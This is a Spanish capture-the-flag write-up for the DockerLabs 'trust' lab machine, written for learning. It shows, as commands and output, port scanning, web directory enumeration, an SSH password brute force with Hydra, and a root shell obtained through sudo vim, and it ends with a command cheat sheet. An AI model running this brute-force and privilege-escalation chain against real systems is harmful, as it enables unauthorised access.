# DockerLabs - trust

## Resumen
- **Dificultad:** Very Easy
- **Técnicas:** Web enumeration (gobuster), SSH brute-forcing, escalada de privilegios vía sudo (vim)
- **Tiempo:** ~15 minutos
- **Fecha:** 2026-04-12

## Info
| | |
|---|---|
| IP | 172.18.0.2 |
| OS | Debian (Docker) |
| Servicios | 22/tcp (SSH), 80/tcp (HTTP) |

---

## Reconocimiento

### Escaneo de puertos

```bash
nmap -sCV -p- 172.18.0.2 -oN targeted
```

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 9.2p1 Debian 2+deb12u2 |
| 80/tcp | HTTP | Apache 2.4.57 |

---

## Enumeración

### Gobuster (HTTP)

```bash
gobuster dir -u http://172.18.0.2 -w /usr/share/dirb/wordlists/big.txt -x php,html,txt
```

Encontramos: `/secret.php`

Al acceder nos muestra:

```
Hola mario
```

**Usuario encontrado:** `mario`

---

## Explotación

### SSH Brute-forcing con Hydra

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2
```

**Credenciales encontradas:**
- Usuario: `mario`
- Contraseña: `chocolate`

### Acceso SSH

```bash
ssh mario@172.18.0.2
password: chocolate
```

---

## Escalada de privilegios

### Enumeración de permisos sudo

```bash
sudo -l
```

**Resultado:**
```
User mario may run the following commands on 0fcf95cedf7a:
    (ALL) /usr/bin/vim
```

### Obtención de shell root

```bash
sudo vim -c ':!/bin/sh'
whoami
# root
```

¡Somos root!

---

## Flag

No hay flag en esta máquina — el objetivo es obtener acceso root.

---

## Lecciones aprendidas

1. **Web enumeration**: siempre correr gobuster con extensiones para encontrar archivos ocultos
2. **Comentarios en PHP**: archivos que muestran mensajes de bienvenida pueden revelar usuarios
3. **sudo -l**: siempre verificar qué comandos puede ejecutar un usuario como root
4. **vim como vector de escalada**: es un método clásico cuando se tiene sudo sobre él

---

## Comandos útiles

```bash
# Reconocimiento
nmap -sCV -p- 172.18.0.2 -oN targeted

# Web enumeration
gobuster dir -u http://172.18.0.2 -w /usr/share/dirb/wordlists/big.txt -x php,html,txt
curl http://172.18.0.2/secret.php

# Brute-force
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2

# Acceso
ssh mario@172.18.0.2

# Escalada
sudo -l
sudo vim -c ':!/bin/sh'
```